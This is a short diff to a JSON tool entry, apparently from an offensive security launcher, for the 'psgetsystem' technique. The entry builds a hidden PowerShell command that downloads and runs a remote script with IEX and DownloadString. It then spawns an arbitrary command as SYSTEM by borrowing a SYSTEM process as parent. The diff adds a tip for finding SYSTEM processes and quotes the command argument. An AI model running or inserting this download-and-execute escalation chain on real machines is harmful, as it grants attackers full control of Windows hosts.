@@ -8,7 +8,7 @@
     "arch": "x64",
     "lang": "PowerShell",
     "privilege": false,
-    "notes": "Blog: https://decoder.cloud/2018/02/02/getting-system/",
+    "notes": "Use powershell Get-Process -IncludeUserName|Where {$_.UserName -eq \"NT AUTHORITY\\SYSTEM\"} to retrieve a list of processes running as SYSTEM. Blog: https://decoder.cloud/2018/02/02/getting-system/",
     "remote": "https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1",
     "local": ["data", "src", "decoder-it", "psgetsystem", "psgetsys.ps1"],
     "options": [
@@ -22,7 +22,7 @@
       "-w",
       "0",
       "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1');",
-      "[MyProcess]::CreateProcessFromParent({{systemPID.Value}},{{CMD.Value}})",
+      "[MyProcess]::CreateProcessFromParent({{systemPID.Value}},'{{CMD.Value}}')",
       "\""
     ]
   },
